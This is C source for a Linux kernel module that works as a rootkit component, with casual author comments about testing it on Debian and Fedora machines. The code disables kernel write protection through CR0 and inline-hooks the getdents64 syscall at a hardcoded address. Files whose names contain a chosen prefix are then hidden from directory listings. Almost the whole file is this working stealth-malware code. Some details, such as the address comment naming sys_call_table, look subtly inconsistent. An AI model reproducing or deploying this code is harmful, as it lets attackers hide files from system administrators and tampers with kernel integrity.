#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

/*
 * I was quite feverish while making this,
 * and so its not very good like at all,
 * but it does hide files with the prefix, 
 * which you can do using `sudo insmod <this.ko> prefix="ABC"` <- that would hide ABC files in the usual way
 * it was also kind of awhile ago, and its a bit dirty as in, not really minimal as my other codes
 * NOTE THIS MIGHT CRASH THE VM because we are doing dirty things instead of the usual, traditional stuff.
 * 
 ** this was tested on 6.12.74+deb13+1-amd64 on Qemu using VIRT MANAGER 
 ** and THINKPAD E14 G6. Using fedora as a bare metal, debian as a vm
 * note: if you want to debug (which you should!) uncomment the print statements below.
 */

MODULE_LICENSE("GPL");

static char *prefix = "SECRET";
module_param(prefix, charp, 0000);

/* The address of the actual function we found in kallsyms */
#define TARGET_FUNC_ADDR 0xffffffff8145fad0 /* sudo cat /proc/kallsyms | grep sys_call_table */

// We need to save the original 12 bytes of the function
unsigned char original_bytes[12];
// This is the "jump" instruction we will inject
// movabs rax, <address>; jmp rax
unsigned char jump_code[12] = {
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, address
    0xFF, 0xE0                                                  // jmp rax
};

typedef asmlinkage long (*t_getdents64)(const struct pt_regs *);

// this is the usual stuff.
static inline void disable_wp(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    asm volatile("mov %0, %%cr0" : "+r"(cr0) : : "memory");
}

static inline void enable_wp(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    asm volatile("mov %0, %%cr0" : "+r"(cr0) : : "memory");
}

// I really should make automation of the above like.. its a bit tiring to write it all the time.


asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret;
    struct linux_dirent64 __user *dirent_user = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long offset = 0;

    // 1. UNHOOK temporarily to call the original function
    disable_wp();
    memcpy((void *)TARGET_FUNC_ADDR, original_bytes, 12);
    enable_wp();

    ret = ((t_getdents64)TARGET_FUNC_ADDR)(regs);

    // 2. RE-HOOK so the next call is caught
    disable_wp();
    memcpy((void *)TARGET_FUNC_ADDR, jump_code, 12);
    enable_wp();

    if (ret <= 0) return ret;

    printk(KERN_INFO "--- INLINE HOOK TRIGGERED: %s ---\n", prefix);

    current_dir = kzalloc(ret, GFP_KERNEL);
    if (!current_dir) return ret;

    if (copy_from_user(current_dir, dirent_user, ret)) {
        kfree(current_dir);
        return ret;
    }

    while (offset < ret) {
        struct linux_dirent64 *entry = (void *)current_dir + offset;
        if (strnstr(entry->d_name, prefix, strlen(entry->d_name))) {
            if (entry == current_dir) {
                ret -= entry->d_reclen;
                memmove(current_dir, (void *)current_dir + entry->d_reclen, ret);
                continue;
            } else {
                previous_dir->d_reclen += entry->d_reclen;
            }
        } else {
            previous_dir = entry;
        }
        offset += entry->d_reclen;
    }

    if (copy_to_user(dirent_user, current_dir, ret)) { }
    kfree(current_dir);
    return ret;
}

static int __init hide_init(void) {
    // Pack our hook address into the jump code
    unsigned long hook_addr = (unsigned long)hooked_getdents64;
    memcpy(&jump_code[2], &hook_addr, 8);

    // Save the original code
    memcpy(original_bytes, (void *)TARGET_FUNC_ADDR, 12);

    // Apply the patch
    disable_wp();
    memcpy((void *)TARGET_FUNC_ADDR, jump_code, 12);
    enable_wp();

    // pr_info("Inline Hook applied to __x64_sys_getdents64\n");
    return 0;
}

static void __exit hide_exit(void) {
    disable_wp();
    memcpy((void *)TARGET_FUNC_ADDR, original_bytes, 12);
    enable_wp();
    // pr_info("Inline Hook removed.\n");
}


module_init(hide_init);
module_exit(hide_exit);
